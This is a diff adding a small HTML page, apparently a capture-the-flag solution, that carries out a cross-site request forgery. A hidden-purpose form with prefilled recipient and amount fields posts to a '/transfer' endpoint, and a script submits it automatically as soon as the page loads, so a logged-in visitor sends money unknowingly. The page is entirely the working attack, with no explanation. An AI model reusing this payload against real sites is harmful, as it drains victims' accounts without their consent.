@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div class="container">
+        <h2 id="sad">You have</h2>
+        <form action='/transfer' method="POST">
+            <div class="form-row">
+              <div class="form-group col-md-6">
+                <label for="inputTo">To</label>
+                <input type="text" class="form-control" id="inputTo" name="user_to" value="var@gmail.com">
+              </div>
+              <div class="form-group col-md-6">
+                <label for="inputAmount">Amount</label>
+                <input type="number" class="form-control" id="inputAmount" name="amount" value="1000">
+              </div>
+            </div>
+            <button type="submit" class="btn btn-primary">Send the Money!</button>
+          </form>
+          <a href="/buyflag">Click here to buy the flag!</a>
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            document.querySelector('form').submit();
+        });
+    </script>
+</body>
+</html>
